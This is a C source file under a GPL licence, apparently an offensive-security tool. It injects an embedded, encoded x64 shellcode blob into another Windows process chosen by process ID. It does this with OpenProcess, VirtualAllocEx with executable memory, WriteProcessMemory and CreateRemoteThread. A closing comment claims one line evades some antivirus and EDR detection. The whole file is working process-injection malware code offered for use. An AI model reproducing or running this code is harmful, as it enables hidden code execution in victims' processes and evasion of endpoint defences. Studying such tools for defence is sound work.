/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
    "\x05\xef\xff\xff\xff\x48\xbb\xd3\x19\x5b\x4e\x88"
    "\x70\xc3\x9d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    "\xff\xe2\xf4\x2f\x51\xd8\xaa\x78\x98\x03\x9d\xd3"
    "\x19\x1a\x1f\xc9\x20\x91\xcc\x85\x51\x6a\x9c\xed"
    "\x38\x48\xcf\xb3\x51\xd0\x1c\x90\x38\x48\xcf\xf3"
    "\x51\xd0\x3c\xd8\x38\xcc\x2a\x99\x53\x16\x7f\x41"
    "\x38\xf2\x5d\x7f\x25\x3a\x32\x8a\x5c\xe3\xdc\x12"
    "\xd0\x56\x0f\x89\xb1\x21\x70\x81\x58\x0a\x06\x03"
    "\x22\xe3\x16\x91\x25\x13\x4f\x58\xfb\x43\x15\xd3"
    "\x19\x5b\x06\x0d\xb0\xb7\xfa\x9b\x18\x8b\x1e\x03"
    "\x38\xdb\xd9\x58\x59\x7b\x07\x89\xa0\x20\xcb\x9b"
    "\xe6\x92\x0f\x03\x44\x4b\xd5\xd2\xcf\x16\x7f\x41"
    "\x38\xf2\x5d\x7f\x58\x9a\x87\x85\x31\xc2\x5c\xeb"
    "\xf9\x2e\xbf\xc4\x73\x8f\xb9\xdb\x5c\x62\x9f\xfd"
    "\xa8\x9b\xd9\x58\x59\x7f\x07\x89\xa0\xa5\xdc\x58"
    "\x15\x13\x0a\x03\x30\xdf\xd4\xd2\xc9\x1a\xc5\x8c"
    "\xf8\x8b\x9c\x03\x58\x03\x0f\xd0\x2e\x9a\xc7\x92"
    "\x41\x1a\x17\xc9\x2a\x8b\x1e\x3f\x39\x1a\x1c\x77"
    "\x90\x9b\xdc\x8a\x43\x13\xc5\x9a\x99\x94\x62\x2c"
    "\xe6\x06\x06\x32\x71\xc3\x9d\xd3\x19\x5b\x4e\x88"
    "\x38\x4e\x10\xd2\x18\x5b\x4e\xc9\xca\xf2\x16\xbc"
    "\x9e\xa4\x9b\x33\x90\xde\xb7\xd9\x58\xe1\xe8\x1d"
    "\xcd\x5e\x62\x06\x51\xd8\x8a\xa0\x4c\xc5\xe1\xd9"
    "\x99\xa0\xae\xfd\x75\x78\xda\xc0\x6b\x34\x24\x88"
    "\x29\x82\x14\x09\xe6\x8e\x2d\xe9\x1c\xa0\xb3\xb6"
    "\x61\x3e\x4e\x88\x70\xc3\x9d";

int main(int argc, char **argv) {
	if (argc != 2) {
		fputs("USAGES: shellcode_injection_Windows <pid>", stderr);
		return 1;
	}
	unsigned int pid = atoi(argv[1]);
	
	HANDLE process_handle = OpenProcess(0x1f0fff, FALSE, pid);
	if (process_handle == NULL) {
		fputs("NULL process handle", stderr);
		return 1;
	}

	LPVOID shellcode_pointer = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), 0x3000, 0x00000040);
	if (process_handle == NULL) {
		fputs("NULL shellcode pointer", stderr);
		return 2;
	}

	unsigned int ok = WriteProcessMemory(process_handle, shellcode_pointer, shellcode, sizeof(shellcode), NULL);
	if (ok == 0) {
		fputs("Write process memory fail.", stderr);
		return 3;
	}

	HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, shellcode_pointer, NULL, 0, NULL);
	if (thread_handle == NULL) {
		fputs("NULL thread handle", stderr);
		return 4;
	}
	WaitForSingleObject(thread_handle, 1000);
	CloseHandle(thread_handle);

	CloseHandle(process_handle); // this line bypass some Antivirus and EDR detection (i don't have any explanation for EDR bypass, i just observed it)
}
